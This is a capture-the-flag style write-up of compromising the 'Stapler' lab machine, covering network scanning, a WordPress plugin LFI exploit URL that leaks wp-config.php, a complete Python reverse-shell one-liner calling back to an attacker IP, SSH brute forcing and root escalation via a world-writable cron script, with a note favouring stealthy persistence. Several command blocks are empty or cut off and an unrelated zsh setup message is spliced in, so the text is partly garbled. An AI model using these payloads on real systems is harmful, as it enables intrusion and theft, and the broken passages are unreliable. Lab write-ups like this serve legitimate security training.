I started out by finding the IP address of the target's machine. This can be done with `netdiscover`, which shows the IP address along with a MAC address. Since I already knew the MAC address (shown in VirtualBox), this could be easily matched with the right IP address. I used the `-r` option to scan for a limited range in which I know the IP address will be, which saves time.

```bash
kali@kali:~$ sudo netdiscover -r 192.168.56.0/16

Currently scanning: 192.168.129.0/16   |   Screen View: Unique Hosts

```

I then ran an nmap scan against the target's IP address `192.168.56.114` to find out more about the target. I used the `-sS`, `-A`, `-n` and `-oA` options because in my opinion these serve a good general purpose with relatively quick but useful results. I saved the output in a file because donâ€™t like to do multiple scans unless I absolutely have to (such as when I need different `nmap` options to fit a very specific purpose).

```bash
kali@kali:~$ sudo nmap -sS -A -n -oA stapler 192.168.56.114

I checked if any of the versions running on the target's machine were vulnerable to any exploits, but couldn't find anything relevant. I then checked FTP since the `nmap` scan mentioned that anonymous access is allowed. Strangely enough this wasn't true - I was presented with a banner and a login prompt that wouldn't accept any (lack of) credentials that I could think of on the spot.

I then entered the target's IP address in a browser to see if anything interested was being hosted on the website on port 80. I couldn't find anything there, confirmed by `nikto` and `dirb`:

```bash

I downloaded the `bashrc` and `.profile` files that were found, but only found standard stuff in them. The fact that there was absolutely nothing to be found on the website didn't sit right with me, so I did a more thorough `nmap` scan just incase and I found this:

```bash

|_http-server-header: Apache/2.4.18 (Ubuntu)

The URLs reported in the previous scan didn't show any different pages than the default one, so I tried visiting them over HTTPS instead of HTTP. Sure enough, `/blogblog` served a Wordpress website. Running `wpscan` on it resulted in the following:

```bash
kali@kali:~$ wpscan --url https://192.168.56.114:12380/blogblog/ --plugins-version-detection aggressive --disable-tls-checks --force -e ap,at

I didn't find any vulnerabilities for the versions of these themes (and the bruteforce on the login form I had running in the background didn't look very promising), but I thought it was strange that no plug-ins were found. Especially when there were posts on the website that specifically mentioned new plug-ins being installed. I modified the options for `wpscan` a bit (and shortened the output to only contain the relevant information):

```bash

It looked like `advanced-video-embed-embed-videos-or-playlists` was vulnerable to a LFI exploit. I did some research on how this exploit works exactly and did the following:

I edited the link in the exploit to fit the target's IP and port: `https://192.168.56.114:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php`

After visiting that link, I checked `/wp-content/uploads` for any new uploads and found the following:

![alt]({{ site.url }}{{ site.baseurl }}/images/stapler_newupload.png)

Inspecting this new file locally gave me the credentials I was after:

I tried again through various other ways of which the following Python alternative worked:

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

```bash
kali@kali:~$ nc -nlvp 7777
listening on [any] 7777 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.114] 32930
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

I have to mention that using `curl` to catch the reverse shell did not work, this had to be done by manually visiting the entire url in my browser: `https://192.168.56.114:12380/blogblog/wp-content/uploads/inject.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`.

I started enumerating the machine for things that stood out. One of the things I noticed was the Python HTTP server running from the `/home/JKanode` directory, so I gave that directory a look.

Both credentials did in fact work. Doing so as `JKanode` didn't gain me much, but doing so as the `peter` was a lot more interesting as this user turned out to be one of the `sudoers`:

This is the Z Shell configuration function for new users,
zsh-newuser-install.
You are seeing this message because you have no zsh startup files
(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
~).  This function can help you with a few settings that should
make your use of the shell easier.

You can:

(q)  Quit and do nothing.  The function will be run again next time.

(0)  Exit, creating the file ~/.zshrc containing just a comment.
     That will prevent this function being run again.

(1)  Continue to the main menu.

(2)  Populate your ~/.zshrc with the configuration recommended
     by the system administrator and exit (you will need to edit
     the file by hand, if so desired).

Note: there were several kernel- and OS-based exploits that I could've used to gain root access. However, these usually take a lot of trial and error (due to being unstable, not working anymore for whatever reason, not fully understanding how to use them, etc.) and can disrupt the target's machine. Whenever I have to choose between two ways to escalate privileges to root I usually choose the one that doesn't involve kernel/OS exploits, as I've done here. The same goes for `metasploit` options that are  limited on the exam for the [OSCP certification](https://www.offensive-security.com/pwk-oscp/) - I try to stay away from those whenever I see alternatives.

## A second approach

When I enumerated the SMB service running on the target, I found a pretty big list of usernames:

I'm not a big fan of running long, intensive bruteforce attempts (especially on the laptop I'm using), so usually I don't go further than checking for identical username and password combinations or very simple wordlist-based attempts. Since I couldn't find anything that interesting using `smbclient`, I went the SSH route instead and went for a quick bruteforce. First, I had to organize all of the usernames from earlier in a .txt file:

```bash
kali@kali:~$ awk -F'\' '{ print $2 }' stapler_users.txt | awk -F' ' '{ print $1 > "stapler_users.txt" }'

Alright, so I had working credentials to directly access the target's machine. Now my goal was to find another way to escalate these limited privileges to full privileges. Using the relatively well-known `linuxprivchecker.py`, I discovered a cron running a `.sh` script as root every 5 minutes that was world writable. Because of that, I was able to overwrite the contents of that `.sh` file with whatever I wanted, and it would execute as root within 5 minutes. For some reason I didn't get any of the `bash` and `python` versions to give me a root shell, but using the `nc` version did the trick giving me full access:

```bash
kali@kali:~$ nc -nlvp 7777
listening on [any] 7777 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.114] 33080
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

Note: I had numerous options in how I would use the write rights on the `.sh` file being executed every 5 minutes. For example, I could've added a new user to the admin group, or to the `sudoers` list. This time I chose for a more stealthy approach however - this way I would only have full access the second a listener is started on my Kali machine. Ideally, this is harder to detect keeping my access to the machine for a longer period of time.

## Lessons learned

There was a lot going on this target's machine, so there were probably more attack vectors than the ones I had used. Regardless, my initial access to the target's machine relied on a vulnerable Wordpress plug-in, advanced-video-embed-embed-videos-or-playlists. This (version of the) plug-in should not be used. In fact, Wordpress websites in general are very plug-in and theme dependent, so it's good practice to keep all of these up-to-date and safe as often as possible.

After that, the shell I created for myself (and the access to remote commands) relied on the fact that my MySQL user had access to `outfile`. This could've been prevented by disabling access to `outfile`.

To elevate my privileges to root level, I relied on the credentials I found in a `.bash_history` file. This could've been prevented by 1) editing the configuration so that `.bash_history` doesn't actually store any command history and/or 2) not typing plaintext passwords in your commands (and not using commands that require this). Both of these are especially true for users with `sudo` rights, as was the case here.

The second approach used the ease with which SSH usernames could be enumerated via SMB and the fact that one of these users used a password identical to their username. SSH usernames should, ideally, be kept more hidden but they should definitely never use a password identical to their username.

The way I elevated my limited access to full access after that, was based on a frequently running cron executing a world writable file as root. This could've been prevented by changing the write rights on the `.sh` file.
